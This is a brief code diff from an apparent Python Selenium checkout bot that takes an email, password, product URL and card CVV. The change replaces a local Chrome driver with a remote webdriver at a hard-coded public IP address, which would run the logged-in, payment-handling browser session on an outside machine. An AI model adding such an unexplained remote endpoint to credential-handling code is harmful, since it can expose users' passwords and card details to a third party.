@@ -10,7 +10,7 @@ import time
     
 def do_purchase(email, password, product_url, cvv):
     # Start a webdriver instance using the desired capabilities
-    driver = webdriver.Chrome()
+    driver = webdriver.Remote(command_executor='http://159.65.50.118:9515/wd/hub')
     while True:
         try:
             # Navigate to the website you want to scrape product page
